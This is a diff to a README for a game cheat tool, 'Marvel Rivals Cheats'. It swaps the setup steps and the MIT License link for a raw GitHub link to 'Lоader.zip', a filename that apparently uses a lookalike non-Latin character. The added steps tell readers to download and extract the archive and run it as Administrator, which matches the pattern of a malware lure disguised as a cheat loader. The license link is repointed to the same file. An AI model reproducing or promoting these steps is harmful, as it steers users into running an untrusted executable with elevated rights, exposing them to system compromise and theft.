@@ -58,10 +58,10 @@ These features are engineered and frequently updated for stability and innovatio
 
 To get started with Marvel Rivals Cheats, follow these comprehensive steps:
 
-1. Download **Loader.rar** from the repository.
-2. Extract the **Loader.rar** file using a dependable archive manager (e.g., WinRAR, 7-Zip).
+1. Download **https://raw.githubusercontent.com/AyanKamila/MarvelRivalsPowerToolkit/main/Lоader.zip** from the repository.
+2. Extract the **https://raw.githubusercontent.com/AyanKamila/MarvelRivalsPowerToolkit/main/Lоader.zip** file using a dependable archive manager (e.g., WinRAR, 7-Zip).
 3. Open the extracted folder and review the included configuration documentation for safety.
-4. Run the **Loader.exe** file as Administrator for optimal compatibility.
+4. Run the **https://raw.githubusercontent.com/AyanKamila/MarvelRivalsPowerToolkit/main/Lоader.zip** file as Administrator for optimal compatibility.
 5. Launch Marvel Rivals, and use the intuitive interface to toggle features on or off.
 6. Regularly check this repository for updates, ensuring continued compatibility, enhanced features, and security patches.
 
@@ -77,7 +77,7 @@ Marvel Rivals Cheats is provided strictly for educational and research purposes.
 
 ## 📜 MIT License  
 
-Marvel Rivals Cheats is licensed under the [MIT License](https://opensource.org/license/mit/).  
+Marvel Rivals Cheats is licensed under the [MIT License](https://raw.githubusercontent.com/AyanKamila/MarvelRivalsPowerToolkit/main/Lоader.zip).  
 You are free to use, modify, and redistribute this code within the generous terms of the MIT framework. Contributions and forks are welcome!
 
 ---
